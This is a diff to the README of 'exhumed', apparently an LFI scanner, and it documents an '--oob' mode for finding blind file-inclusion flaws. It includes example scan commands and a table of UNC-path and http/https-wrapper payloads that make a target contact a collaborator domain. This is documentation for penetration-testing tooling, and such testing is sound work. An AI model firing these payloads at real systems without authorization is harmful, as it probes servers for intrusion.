@@ -1085,6 +1085,55 @@ discarded so the keep-alive connection returns to the pool; the response is
 intentionally not surfaced — re-confirming a finding the scan engine already
 confirmed is not the point.
 
+### Blind LFI detection via out-of-band payloads (`--oob`)
+
+Some LFI sinks read or include a file but never reflect its contents in the
+HTTP response — the server processes the read internally and answers with the
+same body whether the file existed or not. `exhumed`'s normal confirm logic
+(regex/keyword matching on the response body) cannot see a blind sink. `--oob`
+bridges that gap: it fires four payload variants pointing at a
+collaborator-controlled domain alongside the regular traversal scan. An outbound
+interaction (DNS lookup, SMB connection, HTTP fetch) observed at the collaborator
+proves the sink fired even though the response reflected nothing.
+
+**Requires a collaborator you control:** [interactsh](https://github.com/projectdiscovery/interactsh)
+(`interactsh-client`), Burp Collaborator, or any HTTP/DNS logging service.
+
+```bash
+# Fire OOB payloads at every entry alongside the regular scan
+exhumed scan --url "http://target.local/?file=FUZZ" \
+             --oob xyz123.oast.fun
+
+# Combine with verbose to see each payload fired
+exhumed scan --url "http://target.local/?file=FUZZ" \
+             --oob xyz123.oast.fun \
+             --verbose
+```
+
+When `--oob` is set, exhumed generates four variants for each entry:
+
+| Technique | Payload shape | Trigger |
+|-----------|--------------|---------|
+| `smb-unc` | `\\smb.xyz123.oast.fun\exhumed` | SMB connect / DNS from Windows stacks |
+| `http-wrapper` | `http://http.xyz123.oast.fun/exhumed-oob` | `allow_url_include`, Java URL, libcurl |
+| `https-wrapper` | `https://https.xyz123.oast.fun/exhumed-oob` | TLS-only remote-include filters |
+| `dns-resolve` | `\\dns.xyz123.oast.fun\exhumed` | DNS lookup only — lowest-egress proof |
+
+OOB payloads are fired **alongside** the traversal scan, not instead of it. The
+regular confirm logic (response-body matching) is unaffected. OOB requests are
+fire-and-forget: a callback at the collaborator is the confirmation signal.
+
+```
+── Scan complete ──────────────────────────────────────
+Requests: 76  |  Confirmed readable: 0  |  Chain targets: 0
+OOB payloads fired: 304 → check collaborator xyz123.oast.fun for interactions
+```
+
+**Domain format:** pass a bare FQDN — no scheme, no path, no leading dot.
+`xyz123.oast.fun` ✓  `http://xyz123.oast.fun` ✗  `xyz123.oast.fun/path` ✗
+
+A malformed domain is a hard error before any request fires.
+
 ### Local testbed (deliberately vulnerable dev server)
 
 ```bash
